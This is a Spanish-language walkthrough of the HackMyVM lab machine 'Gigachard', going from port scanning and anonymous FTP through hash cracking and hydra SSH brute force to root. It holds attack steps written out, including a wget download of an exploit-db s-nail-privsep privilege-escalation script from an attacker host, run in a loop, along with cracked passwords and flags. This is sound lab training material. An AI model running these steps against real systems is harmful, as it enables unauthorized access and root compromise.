---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Gigachard HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-15 03:17 EDT
Nmap scan report for 192.168.1.177
Host is up (0.00024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.146
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/kingchad.html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:AC:6A:6D (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```

Veremos un puerto `80`, pero tambien un `FTP` por lo que vamos a ver que nos encontramos en dicho `FTP`:

```shell
ftp anonymous@<IP>
```

Veremos que funciona, si listamos veremos lo siguiente:

Info:

```
229 Entering Extended Passive Mode (|||9775|)
150 Here comes the directory listing.
dr-xr-xr-x    2 1000     1000         4096 Feb 07  2021 .
dr-xr-xr-x    2 1000     1000         4096 Feb 07  2021 ..
-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo
226 Directory send OK.
```

Vemos un archivo llamado `chadinfo` por lo que vamos a descargarnoslo y leerlo.

```shell
get chadinfo
```

Ahora si lo leemos:

```
PK
0
 HR��▒ƃchadinfoUT       �j `Zj `ux
                                  why yes,
#######################
username is chad
???????????????????????
password?
!!!!!!!!!!!!!!!!!!!!!!!
go to /drippinchad.png
PK
0
 HR��▒ƃ▒��chadinfoUT�j `ux
                          PKN�
```

Veremos algunas cosas raras pero lo que si veremos sera que tenemos el nombre de usuario que seria `chad` y tambien no dice algo de `/drippinchad.png` por lo que vamos a descargarnos la imagen si existiera en dicha ruta de la siguiente forma:

```shell
wget http://<IP>/drippinchad.png
```

Pero antes de extraer algun `metadato` o algo parecido, vamos a ir a la pagina del puerto `80` y vamos a ver que encontramos, si entramos e inspeccionamos la pagina veremos lo siguiente:

```html
<!--


A7F9B77C16A3AA80DAA4E378659226F628326A95
D82D10564866FD9B201941BCC6C94022196F8EE8 -->
```

Vamos a ver que puede significar eso, podemos suponer que puede ser un `MD5` por lo que vamos a guardarlo en un `hash` y vamos a intentar crackearlo.

## Crack MD5

> hash

```
A7F9B77C16A3AA80DAA4E378659226F628326A95
D82D10564866FD9B201941BCC6C94022196F8EE8
```

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
fuck you         (?)     
VIRGIN           (?)     
2g 0:00:00:00 DONE (2025-04-15 03:26) 66.66g/s 1712Kp/s 1712Kc/s 1943KC/s abc789..Trevor
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, pero no encontraremos gran cosa, por lo que vamos a pasar ahora a intentar ver que imagen nos descargamos:

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos un meme en si, pero puede ser que tenga algo que ver esa torre de fondo, por lo que ahora si vamos a extraer los `metadatos` de la imagen a ver si conseguimos encontrar dicha ubicacion de la imagen.

## exiftool

```shell
exiftool drippinchad.png
```

Pero no veremos que contenga datos de `geolocalizacion` por lo que vamos a buscar dicha torre a mano, con `Google Lens` y veremos que la hemos encontrado, nos informamos y veremos en `Wikipedia` como se llama la torre.

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Vemos que se llama `Maiden's Tower`, pero vamos a dejarlo sin las `'` y un poco mas limpio de estas formas:

> pass.txt

```
MaidensTower
maidenstower
maidentower
tower
maidens
maiden
LeandersTower
leanderstower
leanders
leander
```

Vamos a crearnos un archivo de contraseñas para el usuario `chad` a ver si funciona, ahora probaremos con `hydra` para realizar fuerza bruta.

## Escalate user chad

### Hydra

```shell
hydra -l chad -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-15 03:40:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
[DATA] attacking ssh://192.168.1.177:22/
[22][ssh] host: 192.168.1.177   login: chad   password: maidenstower
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-15 03:40:03
```

Veremos que ha funcionado, por lo que vamos a conectarnos por `SSH` de la siguiente forma:

### SSH

```shell
ssh chad@<IP>
```

Metemos como contraseña `maidenstower` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
0FAD8F4B099A26E004376EAB42B6A56A
```

## Escalate Privileges

Si listamos los permisos `SUID` veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
25269    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
    31941     12 -rwsr-xr-x   1 root     root        10104 Jan  1  2016 /usr/lib/s-nail/s-nail-privsep
    21909     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    16365     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
       81     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
     4028     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
       76     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
     4030     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
     3547     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
     3694     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
       79     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
       77     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
```

Veremos entre todo esto una cosa bastante interesante y muy poco comun, que seria la siguiente linea:

```
31941 12 -rwsr-xr-x  1 root  root 10104 Jan 1 2016 /usr/lib/s-nail/s-nail-privsep
```

Si empezamos a buscar dicho binario a ver si encontramos alguna vulnerabilidad efectivamente la encontraremos y es que ese binario no deberia de tener permisos `SUID` ya que podremos realizar esto:

URL = [Vulnerabilidad S-nail LPE](https://www.exploit-db.com/exploits/47172)

Vamos a descargarnos el archivo en nuestra maquina `host` echo eso, nos abriremos un servidor de `python3` para pasarnos el archivo a la maquina victima:

```shell
python3 -m http.server 80
```

Ahora en la maquina victima ejecutaremos lo siguiente:

```shell
cd /tmp
wget http://<IP_ATTACKER>/47172.sh
```

Echo esto estableceremos los permisos de ejecuccion por si acaso al `.sh`:

```shell
chmod +x 47172.sh
```

Y por ultimo vamos a ejecutarlo a ver si funciona:

```shell
bash 47172.sh
```

Pero veremos que no funciona, estuve investigando y no siempre funciona a la primera, por lo que vamos a crear un bucle ejecutandose continuamente hasta que funcione:

```shell
while true; do ./47172.sh ;done
```

Esperando un rato veremos que ha funcionado y veremos lo siguiente:

```
[-] Failed. Not vulnerable?
[.] Cleaning up...
[-] Failed
[~] Found privsep: /usr/lib/s-nail/s-nail-privsep
[.] Compiling /var/tmp/.snail.so.c ...
[.] Compiling /var/tmp/.sh.c ...
[.] Compiling /var/tmp/.privget.c ...
[.] Adding /var/tmp/.snail.so to /etc/ld.so.preload ...
[=] s-nail-privsep local root by @wapiflapi
[.] Started flood in /etc/ld.so.preload
[.] Started race with /usr/lib/s-nail/s-nail-privsep
[.] This could take a while...
.............................................................
[.] Race #631 of 1000 ...
[+] got root! /var/tmp/.sh (uid=0 gid=0)
[.] Cleaning up...
[+] Success:
-rwsr-xr-x 1 root root 14424 Apr 15 03:01 /var/tmp/.sh
[.] Launching root shell: /var/tmp/.sh
# whoami
root
```

Por lo que veremos con esto ya seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
832B123648707C6CD022DD9009AEF2FD
```
